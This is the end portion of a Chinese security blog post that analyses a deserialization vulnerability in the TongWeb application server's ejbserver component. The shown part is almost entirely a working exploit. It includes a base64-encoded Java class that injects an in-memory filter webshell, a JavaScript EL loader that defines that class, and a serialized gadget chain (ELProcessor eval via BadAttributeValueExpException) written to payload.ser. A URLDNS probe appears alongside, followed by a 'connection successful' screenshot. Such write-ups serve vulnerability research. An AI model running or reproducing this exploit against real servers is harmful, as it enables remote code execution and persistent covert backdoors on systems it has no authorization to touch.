1d2FSUnYvSDYrd1grS1dPbitOWGRKZDBVd3JnZVlHNjBaaUdYM04yMmNWYzU1bU1iWGJHZWhPSEZtY2FzMzZSWTg3VDk0WmxBTC9qTGJHeVc4cnRsTStsTXVQdVI1bVdaTmRZK1drV2pidHFCRGpsWnFqdmM0ZGxrOXVtdlBhSERMZjQraEpoYlg1UjFQRWJrb0hDaDBaMTAvTDlUL3phcm9QT2RiQmkzY1QxdW9yMWV2ZWQzNnI4L1ROM052QXArR3hvbmNXbVMxQi9Tcnk1TEE3VHBJNVBmMnZiTEs1ZmxHOUZoTHVVaTNVTUljaTlmN1JkeGM3dSt2YXJ1TFc3SVZMZmV2SXlkczJqcFk0Vm5LOWNxcmUyRXJvZXcrUEtZaDc3QkxyOUM5Zy80cDlGZDdjVzBjSUgydVlSOCtFa1h3KzJSaHBLT0xxMGZtWEVYMzczaCtQSzFlQThobndJRDgvaE5kMkJTS0JoQVErTXVQc2xqSVdIWnlGTHlFUUNkSmdYS0tFNGgra1MzdGpkdUlDNmtUbTh2WVIzemVMZGtVWmZwUEZLQ2U4cjRjUGRla1NQYUNWODR1U2xDOUM3L1JGL0NaL3FhR3VmeCtkOXVNVE1RM2dlTDNKZUN2eUZXYStINzE5NFFjTk9EYmVTSlR2OCtLdkNpdGpjZ0J1cHd3K2tNbzZ0M1BQeHFiZUZEODdoU3pNRGJUTXU3SDRXYjlHYkgrS0lXaldxbWViaGl5RzMwRUJIYXdsUERyU0h6eitCRzlzSjRNeGdSMzBKSmJVOVB6UFlYc0ozQnk3ODUrOEx1RGd5aTZlZm9jTWdROWpPcnZkY044SDNUelJvT0RlczRXTEFqVkxSNThzOGkxZHYrYXhIWFRvQkUrRm41dkNEOEk5OFQrTmNDVDhUZko0djRiazRqMzB5L0VJOWQwZDg0WTRFUlcxY25CL3h0Zkw5dWF2NERmOW40dUhmMHBoUURyUXI5ZDlYcXJldlZuZEI2TUVCaHJJRXdzTWFWOHNoQ243cy9LRWNZcFBMWWZMT1krS2lrc0w2ajB1VWJuSTV1cVNFL3dKMXI5U2NpZzRBQUE9PQgADwEABjxpbml0PgEAAygpVgEAE2phdmEvbGFuZy9FeGNlcHRpb24HABMMABEAEgoABAAVAQAPamF2YS9sYW5nL0NsYXNzBwAXAQAHZ2V0TmFtZQwAGQAICgAYABoBABhqYXZhL3V0aWwvbG9nZ2luZy9Mb2dnZXIHABwBAAlnZXRMb2dnZXIBAC4oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvbG9nZ2luZy9Mb2dnZXI7DAAeAB8KAB0AIAwABQAGCQACACIBAApnZXRDb250ZXh0AQARKClMamF2YS91dGlsL1NldDsMACQAJQoAAgAmAQANamF2YS91dGlsL1NldAcAKAEACGl0ZXJhdG9yAQAWKClMamF2YS91dGlsL0l0ZXJhdG9yOwwAKgArCwApACwBABJqYXZhL3V0aWwvSXRlcmF0b3IHAC4BAAdoYXNOZXh0AQADKClaDAAwADELAC8AMgEABG5leHQBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwwANAA1CwAvADYBAAhnZXRTaGVsbAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DAA4ADkKAAIAOgEABmluamVjdAEAJyhMamF2YS9sYW5nL09iamVjdDtMamF2YS9sYW5nL09iamVjdDspVgwAPAA9CgACAD4BACUoKUxqYXZhL3V0aWwvU2V0PExqYXZhL2xhbmcvT2JqZWN0Oz47AQARamF2YS91dGlsL0hhc2hTZXQHAEEKAEIAFQEAEGphdmEvbGFuZy9UaHJlYWQHAEQBABFnZXRBbGxTdGFja1RyYWNlcwEAESgpTGphdmEvdXRpbC9NYXA7DABGAEcKAEUASAEADWphdmEvdXRpbC9NYXAHAEoBAAZrZXlTZXQMAEwAJQsASwBNCgBFABoBABxDb250YWluZXJCYWNrZ3JvdW5kUHJvY2Vzc29yCABQAQAQamF2YS9sYW5nL1N0cmluZwcAUgEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDABUAFUKAFMAVgEABnRhcmdldAgAWAEADWdldEZpZWxkVmFsdWUBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvT2JqZWN0OwwAWgBbCgACAFwBAAZ0aGlzJDAIAF4BAAhjaGlsZHJlbggAYAEABnZhbHVlcwEAGCgpTGphdmEvdXRpbC9Db2xsZWN0aW9uOwwAYgBjCwBLAGQBABRqYXZhL3V0aWwvQ29sbGVjdGlvbgcAZgsAZwAsAQAGYWRkQWxsAQAZKExqYXZhL3V0aWwvQ29sbGVjdGlvbjspWgwAaQBqCwApAGsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DABtAG4KAEUAbwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwwAcQByCgAEAHMBAA1nZXRTaW1wbGVOYW1lDAB1AAgKABgAdgEAGFRvbmdXZWJXZWJhcHBDbGFzc0xvYWRlcggAeAEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgwAegB7CgBTAHwBAAlyZXNvdXJjZXMIAH4BAAdjb250ZXh0CACAAQADYWRkDACCAHsLACkAgwEAFGdldFdlYkFwcENsYXNzTG9hZGVyAQArKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwEADmdldENsYXNzTG9hZGVyCACHAQAMaW52b2tlTWV0aG9kAQBdKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzO1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DACJAIoKAAIAiwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgcAjQEACWdldExvYWRlcggAjwwAhQCGCgACAJEMAAsACAoAAgCTAQAJbG9hZENsYXNzAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwwAlQCWCgCOAJcBAAtuZXdJbnN0YW5jZQwAmQA1CgAYAJoMAA4ACAoAAgCcAQAMZGVjb2RlQmFzZTY0AQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgwAngCfCgACAKABAA5nemlwRGVjb21wcmVzcwEABihbQilbQgwAogCjCgACAKQBAAtkZWZpbmVDbGFzcwgApgEAAltCBwCoAQARamF2YS9sYW5nL0ludGVnZXIHAKoBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAKwArQkAqwCuAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DACwALEKABgAsgEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcAtAEADXNldEFjY2Vzc2libGUBAAQoWilWDAC2ALcKALUAuAEAB3ZhbHVlT2YBABYoSSlMamF2YS9sYW5nL0ludGVnZXI7DAC6ALsKAKsAvAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAvgC/CgC1AMABAA1maW5kRmlsdGVyRGVmCADCAQAXZmlsdGVyIGFscmVhZHkgaW5qZWN0ZWQIAMQMAIcAbgoAGADGAQAxY29tLnRvbmd3ZWIuY2F0YWxpbmEuY29yZS5BcHBsaWNhdGlvbkZpbHRlckNvbmZpZwgAyAEAF2dldERlY2xhcmVkQ29uc3RydWN0b3JzAQAiKClbTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwwAygDLCgAYAMwBAC1jb20udG9uZ3dlYi53ZWIudXRpbC5kZXNjcmlwdG9yLndlYi5GaWx0ZXJEZWYIAM4BAC1jb20udG9uZ3dlYi53ZWIudXRpbC5kZXNjcmlwdG9yLndlYi5GaWx0ZXJNYXAIANABADFjb20udG9uZ3dlYi53ZWIudGhvci5jb3JlLkFwcGxpY2F0aW9uRmlsdGVyQ29uZmlnCADSAQAlY29tLnRvbmd3ZWIud2ViLnRob3IuZGVwbG95LkZpbHRlckRlZggA1AEAJWNvbS50b25nd2ViLndlYi50aG9yLmRlcGxveS5GaWx0ZXJNYXAIANYBAC9jb20udG9uZ3dlYi5zZXJ2ZXIuY29yZS5BcHBsaWNhdGlvbkZpbHRlckNvbmZpZwgA2AEAHWphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yBwDaAQANc2V0RmlsdGVyTmFtZQgA3AEADnNldEZpbHRlckNsYXNzCADeAQAMYWRkRmlsdGVyRGVmCADgAQANYWRkVVJMUGF0dGVybggA4gwABwAICgACAOQBABJhZGRGaWx0ZXJNYXBCZWZvcmUIAOYKANsAuAEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAmQDpCgDbAOoBAA1maWx0ZXJDb25maWdzCADsAQADcHV0AQA4KExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAO4A7wsASwDwAQAVZmlsdGVyIGluamVjdCBzdWNjZXNzCADyAQAQamF2YS51dGlsLkJhc2U2NAgA9AEAB2Zvck5hbWUMAPYAlgoAGAD3AQAKZ2V0RGVjb2RlcggA+QEACWdldE1ldGhvZAwA+wCxCgAYAPwBAAZkZWNvZGUIAP4BABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyCAEAAQAMZGVjb2RlQnVmZmVyCAECAQATamF2YS9pby9JT0V4Y2VwdGlvbgcBBAEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwEGCgEHABUBAB1qYXZhL3V0aWwvemlwL0daSVBJbnB1dFN0cmVhbQcBCQEAHGphdmEvaW8vQnl0ZUFycmF5SW5wdXRTdHJlYW0HAQsBAAUoW0IpVgwAEQENCgEMAQ4BABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYMABEBEAoBCgERAQAEcmVhZAEABShbQilJDAETARQKAQoBFQEABXdyaXRlAQAHKFtCSUkpVgwBFwEYCgEHARkBAAt0b0J5dGVBcnJheQEABCgpW0IMARsBHAoBBwEdAQAFY2xvc2UMAR8AEgoBCgEgCgEHASABABNqYXZhL2xhbmcvVGhyb3dhYmxlBwEjAQBgKExqYXZhL2xhbmcvT2JqZWN0O0xqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzPCo+O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAfamF2YS9sYW5nL05vU3VjaE1ldGhvZEV4Y2VwdGlvbgcBJgEADWdldFN1cGVyY2xhc3MMASgAcgoAGAEpAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIHASsKASwAFQEAEk1ldGhvZCBub3QgZm91bmQ6IAgBLgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOww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\&quot;;var className = \&quot;org.apache.commons.mwXAX.SerializationUtil\&quot;;var clsString = java.lang.Class.forName(\&quot;java.lang.String\&quot;);var bytecode;try &#123; var decoder = java.lang.Class.forName(\&quot;java.util.Base64\&quot;).getMethod(\&quot;getDecoder\&quot;).invoke(null); bytecode = decoder.getClass().getMethod(\&quot;decode\&quot;, clsString).invoke(decoder, base64Str);&#125; catch (ee) &#123; var decoder = java.lang.Class.forName(\&quot;sun.misc.BASE64Decoder\&quot;).newInstance(); bytecode = decoder.getClass().getMethod(\&quot;decodeBuffer\&quot;, clsString).invoke(decoder, base64Str);&#125;var clsByteArray = (new java.lang.String(\&quot;a\&quot;).getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = java.lang.Class.forName(\&quot;java.lang.ClassLoader\&quot;).getDeclaredMethod(\&quot;defineClass\&quot;, [clsString, clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName(\&quot;java.net.URL\&quot;), 0),java.lang.Thread.currentThread().getContextClassLoader()), className, bytecode, new java.lang.Integer(0), new java.lang.Integer(bytecode.length));clazz.newInstance();&#x27;)&quot;</span>;</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;com.tongweb.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;x=eval&quot;</span>));</span><br><span class="line">        ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;x&quot;</span>, elString));</span><br><span class="line"></span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) Reflections.createWithoutConstructor(WritableContext.class);</span><br><span class="line">        ContextUtil.<span class="type">ReadOnlyBinding</span> <span class="variable">binding</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContextUtil</span>.ReadOnlyBinding(<span class="string">&quot;foo&quot;</span>, ref, ctx);</span><br><span class="line">        Reflections.setFieldValue(binding, <span class="string">&quot;boundObj&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>((Object)<span class="literal">null</span>);</span><br><span class="line">        Reflections.setFieldValue(badAttributeValueExpException, <span class="string">&quot;val&quot;</span>, binding);</span><br><span class="line">        Reflections.setFieldValue(badAttributeValueExpException, <span class="string">&quot;stackTrace&quot;</span>, <span class="keyword">new</span> <span class="title class_">StackTraceElement</span>[<span class="number">0</span>]);</span><br><span class="line">        Reflections.setFieldValue(badAttributeValueExpException, <span class="string">&quot;suppressedExceptions&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line">        Reflections.setFieldValue(badAttributeValueExpException, <span class="string">&quot;cause&quot;</span>, (Object)<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] data = serialize(badAttributeValueExpException);</span><br><span class="line">        Files.write(Paths.get(<span class="string">&quot;payload.ser&quot;</span>), data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(Object object) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">spec</span> <span class="operator">=</span> <span class="string">&quot;W3EP/4.2&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] bytes = spec.getBytes(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        byteArrayOutputStream.write(bytes);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        oos.writeByte(<span class="number">1</span>);</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">        oos.flush();</span><br><span class="line">        <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">URLDNS</span><span class="params">(String dnslog)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">dnslogDomain</span> <span class="operator">=</span> dnslog;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://&quot;</span> + dnslogDomain);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> url.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(url, <span class="number">12345</span>);</span><br><span class="line">        hashMap.put(url, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        f.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>连接成功</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20251120000900-m56q4yw.png" alt="image-20251120000900-m56q4yw"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/09/25/CVE-2025-41243%20Spring%20Cloud%20Gateway%20%E7%8E%AF%E5%A2%83%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2025-11-20 10:18:25
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TongWeb-ejbserver-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">TongWeb ejbserver 反序列化漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-text">入口点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9D%91%E7%82%B91"><span class="toc-text">坑点1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9D%91%E7%82%B92"><span class="toc-text">坑点2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%87%BD%E6%95%B0"><span class="toc-text">序列化函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#URLDNS%E6%8E%A2%E6%B5%8B"><span class="toc-text">URLDNS探测</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5"><span class="toc-text">内存马注入</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + TongWeb%20ejbserver%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%20%26%20%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5 + '&url=' + http%3A%2F%2Fkagty1.github.io%2F2025%2F11%2F20%2FTongWeb%2520ejbserver%2520%25E5%258F%258D%25E5%25BA%258F%25E5%2588%2597%25E5%258C%2596%25E6%25BC%258F%25E6%25B4%259E%25E5%2588%2586%25E6%259E%2590%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/2025/11/20/TongWeb%20ejbserver%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
